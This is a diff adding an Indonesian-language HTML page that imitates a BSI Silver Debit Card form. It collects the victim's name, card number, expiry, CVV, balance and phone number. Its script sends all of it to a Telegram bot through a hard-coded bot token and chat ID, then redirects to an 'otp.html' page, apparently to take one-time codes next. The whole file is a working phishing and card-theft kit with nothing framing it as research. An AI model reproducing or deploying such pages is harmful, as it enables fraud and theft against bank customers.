@@ -1,0 +1,94 @@
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg w-80 relative">
+        <div class="flex justify-center mb-4 relative">
+            <img alt="BSI Silver Debit Card" class="rounded-lg" height="100" src="https://github.com/user-attachments/assets/51ef7b04-8dde-44cd-8fc8-812745be34af" width="200"/>
+        </div>
+        <form id="loginForm" onsubmit="sendData(); return false;">
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-gray-700">Nama Lengkap</label>
+                    <input id="name" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" type="text" required />
+                </div>
+                <div>
+                    <label class="block text-gray-700">Nomor Kartu ATM</label>
+                    <input id="cardNumber" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" type="text" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+                </div>
+                <div class="flex space-x-2">
+                    <div class="w-1/2">
+                        <label class="block text-gray-700">Bulan</label>
+                        <select id="month" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" required>
+                            <option value="" disabled selected>Bulan</option>
+                            <option>Januari</option>
+                            <option>Februari</option>
+                            <option>Maret</option>
+                            <option>April</option>
+                            <option>Mei</option>
+                            <option>Juni</option>
+                            <option>Juli</option>
+                            <option>Agustus</option>
+                            <option>September</option>
+                            <option>Oktober</option>
+                            <option>November</option>
+                            <option>Desember</option>
+                        </select>
+                    </div>
+                    <div class="w-1/2">
+                        <label class="block text-gray-700">Tahun</label>
+                        <select id="year" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" required>
+                            <option value="" disabled selected>Tahun</option>
+                            <script>
+                                for (let year = 1995; year <= 2024; year++) {
+                                    document.write(`<option>${year}</option>`);
+                                }
+                            </script>
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-gray-700">CVV</label>
+                    <input id="cvv" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" type="text" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+                </div>
+                <div>
+                    <label class="block text-gray-700">Rp Saldo</label>
+                    <input id="saldo" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" type="text" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+                </div>
+                <div>
+                    <label class="block text-gray-700">No HP</label>
+                    <input id="phone" class="w-full p-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-500" type="text" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+                </div>
+                <div>
+                    <button type="submit" class="w-full bg-teal-500 text-white p-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-700">Lanjutkan</button>
+                </div>
+            </div>
+        </form>
+    </div>
+    <script>
+        async function sendData() {
+            const name = document.getElementById('name').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const month = document.getElementById('month').value;
+            const year = document.getElementById('year').value;
+            const cvv = document.getElementById('cvv').value;
+            const saldo = document.getElementById('saldo').value;
+            const phone = document.getElementById('phone').value;
+
+            // Kirim data ke bot Telegram
+            const chatId = '7070826282'; // Ganti dengan chat ID Anda
+            const botToken = '8163161222:AAEvcL4ec1JGhU_Xo7dz2NauYq6DU-z6vN0'; // Ganti dengan token bot Telegram Anda
+            const message = `Nama Lengkap: ${name}\nNomor Kartu: ${cardNumber}\nBulan: ${month}\nTahun: ${year}\nCVV: ${cvv}\nSaldo: Rp${saldo}\nNo HP: ${phone}`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            await fetch(url);
+
+            // Arahkan ke halaman OTP
+            window.location.href = "otp.html";
+        }
+    </script>
+</body>
+</html>
